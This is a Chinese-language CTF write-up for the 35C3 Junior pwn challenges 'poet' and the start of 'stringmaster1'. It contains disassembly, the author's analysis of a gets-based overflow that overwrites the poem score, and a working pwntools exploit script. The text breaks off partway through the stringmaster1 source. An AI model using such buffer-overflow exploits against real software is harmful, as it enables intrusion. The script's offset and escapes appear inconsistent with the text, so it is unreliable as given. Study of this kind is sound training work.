       0x0000000000400986 :    add    rsp,0x8
       0x000000000040098a :    ret
    End of assembler dump.
没什么大问题，不过用了gets可能会存在越界写什么的先保留可能  
接着看下关键的评分函数
    Dump of assembler code for function rate_poem:
       0x00000000004007b7 :        push   r13
       0x00000000004007b9 :        push   r12
       0x00000000004007bb :        push   rbp
       0x00000000004007bc :        push   rbx
       0x00000000004007bd :        sub    rsp,0x408
       0x00000000004007c4 :    mov    rbx,rsp
       0x00000000004007c7 :    lea    rsi,[rip+0x2018d2]        # 0x6020a0 
       0x00000000004007ce :    mov    rdi,rbx
       0x00000000004007d1 :    call   0x4005f0 
       0x00000000004007d6 :    lea    rsi,[rip+0x2b4]        # 0x400a91
       0x00000000004007dd :    mov    rdi,rbx
       0x00000000004007e0 :    call   0x400660 
       0x00000000004007e5 :    test   rax,rax
       0x00000000004007e8 :    je     0x400909 
       0x00000000004007ee :    lea    rbx,[rip+0x29f]        # 0x400a94 "ESPR"
       0x00000000004007f5 :    lea    rbp,[rip+0x2aa]        # 0x400aa6 "eat"
       0x00000000004007fc :    lea    r12,[rip+0x296]        # 0x400a99 "sleep"
       0x0000000000400803 :    lea    r13,[rip+0x295]        # 0x400a9f "pwn"
       0x000000000040080a :    jmp    0x40082d 
       0x000000000040080c :    add    DWORD PTR [rip+0x201ccd],0x64        # 0x6024e0 
       0x0000000000400813 :    lea    rsi,[rip+0x277]        # 0x400a91 "n"
       0x000000000040081a :    mov    edi,0x0
       0x000000000040081f :    call   0x400660 
       0x0000000000400824 :    test   rax,rax
       0x0000000000400827 :    je     0x400909 
       0x000000000040082d :    mov    ecx,0x5
       0x0000000000400832 :    mov    rsi,rax
       0x0000000000400835 :    mov    rdi,rbx
       0x0000000000400838 :    repz cmps BYTE PTR ds:[rsi],BYTE PTR es:[rdi]
       0x000000000040083a :    seta   dl
       0x000000000040083d :    sbb    dl,0x0
       0x0000000000400840 :    test   dl,dl
       0x0000000000400842 :    je     0x40080c 
       0x0000000000400844 :    mov    ecx,0x4
       0x0000000000400849 :    mov    rsi,rax
       0x000000000040084c :    mov    rdi,rbp
       0x000000000040084f :    repz cmps BYTE PTR ds:[rsi],BYTE PTR es:[rdi]
       0x0000000000400851 :    seta   dl
       0x0000000000400854 :    sbb    dl,0x0
       0x0000000000400857 :    test   dl,dl
       0x0000000000400859 :    je     0x40080c 
       0x000000000040085b :    mov    ecx,0x6
       0x0000000000400860 :    mov    rsi,rax
       0x0000000000400863 :    mov    rdi,r12
       0x0000000000400866 :    repz cmps BYTE PTR ds:[rsi],BYTE PTR es:[rdi]
       0x0000000000400868 :    seta   dl
       0x000000000040086b :    sbb    dl,0x0
       0x000000000040086e :    test   dl,dl
       0x0000000000400870 :    je     0x40080c 
       0x0000000000400872 :    mov    ecx,0x4
       0x0000000000400877 :    mov    rsi,rax
       0x000000000040087a :    mov    rdi,r13
       0x000000000040087d :    repz cmps BYTE PTR ds:[rsi],BYTE PTR es:[rdi]
       0x000000000040087f :    seta   dl
       0x0000000000400882 :    sbb    dl,0x0
       0x0000000000400885 :    test   dl,dl
       0x0000000000400887 :    je     0x40080c 
       0x0000000000400889 :    mov    ecx,0x7
       0x000000000040088e :    lea    rdi,[rip+0x20e]        # 0x400aa3 "repeat"
       0x0000000000400895 :    mov    rsi,rax
       0x0000000000400898 :    repz cmps BYTE PTR ds:[rsi],BYTE PTR es:[rdi]
       0x000000000040089a :    seta   dl
       0x000000000040089d :    sbb    dl,0x0
       0x00000000004008a0 :    test   dl,dl
       0x00000000004008a2 :    je     0x40080c 
       0x00000000004008a8 :    mov    ecx,0x4
       0x00000000004008ad :    lea    rdi,[rip+0x1f6]        # 0x400aaa "CTF"
       0x00000000004008b4 :    mov    rsi,rax
       0x00000000004008b7 :    repz cmps BYTE PTR ds:[rsi],BYTE PTR es:[rdi]
       0x00000000004008b9 :    seta   dl
       0x00000000004008bc :    sbb    dl,0x0
       0x00000000004008bf :    test   dl,dl
       0x00000000004008c1 :    je     0x40080c 
       0x00000000004008c7 :    mov    ecx,0x8
       0x00000000004008cc :    lea    rdi,[rip+0x1db]        # 0x400aae "capture"
       0x00000000004008d3 :    mov    rsi,rax
       0x00000000004008d6 :    repz cmps BYTE PTR ds:[rsi],BYTE PTR es:[rdi]
       0x00000000004008d8 :    seta   dl
       0x00000000004008db :    sbb    dl,0x0
       0x00000000004008de :    test   dl,dl
       0x00000000004008e0 :    je     0x40080c 
       0x00000000004008e6 :    mov    ecx,0x5
       0x00000000004008eb :    lea    rdi,[rip+0x1c4]        # 0x400ab6 "flag"
       0x00000000004008f2 :    mov    rsi,rax
       0x00000000004008f5 :    repz cmps BYTE PTR ds:[rsi],BYTE PTR es:[rdi]
       0x00000000004008f7 :    seta   al
       0x00000000004008fa :    sbb    al,0x0
       0x00000000004008fc :    test   al,al
       0x00000000004008fe :    jne    0x400813 
       0x0000000000400904 :    jmp    0x40080c 
       0x0000000000400909 :    mov    edx,DWORD PTR [rip+0x201bd1]  # 0x6024e0 
       0x000000000040090f :    lea    rsi,[rip+0x20178a]            # 0x6020a0 
       0x0000000000400916 :    lea    rdi,[rip+0x283]        # 0x400ba0
       0x000000000040091d :    mov    eax,0x0
       0x0000000000400922 :    call   0x400610 
       0x0000000000400927 :    add    rsp,0x408
       0x000000000040092e :    pop    rbx
       0x000000000040092f :    pop    rbp
       0x0000000000400930 :    pop    r12
       0x0000000000400932 :    pop    r13
       0x0000000000400934 :    ret
    End of assembler dump.
这一大段看了半天还是很混乱就去用ida反编译了一下发现还是很乱就换动态调试去理解下这里是做了什么  
输了一堆脏数据后发现诗中有’flag’,’CTF’,’capture’，’repeat’的每有其中一个就加100point,但不能直接输入10000个’CTF’，程序会崩,这里稍稍卡了一会，不过在尝试输入了`'a'*
0x100` 和’`b'*
0x100`后，返回得到的分数是1650614882，突然出现一个大数让我看到溢出的可能性，调试…………发现这个分数转十六进制是0x62626262,立马意识到这里的author可以直接溢出覆盖poem
point的结果！经过简单定位得到偏移量为0x3c,我们把1000000转成十六进制就是0x0f4240，然后直接`'a'*0x3c+'x0fx42x40'`得到的poem
point是0x40420f(4211215)并不是想要的point,稍微改一下payload改成小端序的  
`payload = 'a' * 0x3c + 'x40x42x0f'`，success！
EXP
    #! /usr/bin/env python
    # -*- coding: utf-8 -*-    from pwn import*
    context(os='linux',arch='amd64',log_level='debug')
    n = process('./poet')
    elf = ELF('./poet')
    n.recvuntil('> ')
    n.sendline('nepire')
    n.recvuntil('> ')
    n.sendline('a'*64+'x0fx42x40')
    n.interactive()
###  stringmaster1
    ➜  stringmaster1 checksec stringmaster1
    [*] '/home/Ep3ius/CTF/pwn/process/35c3CTF2018/Junior/stringmaster1/stringmaster1'
        Arch:     amd64-64-little
        RELRO:    Partial RELRO
        Stack:    No canary found
        NX:       NX enabled
        PIE:      No PIE (0x400000)
在粗略过一遍接近4k行还看得难受得半死的c++汇编后,立即推放弃看汇编，给了源码就直接怼源码
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    using namespace std;
    const string chars = "abcdefghijklmnopqrstuvwxy";
    void spawn_shell()
    {
        char* args[] = {(char*)"/bin/bash", NULL};
        execve("/bin/bash", args, NULL);
    }
    void print_menu()
    {
        cout                     (Cost: 1)"                    (Cost: 1)" << endl;
        cout << "[3] print                                    (Cost: 1)" << endl;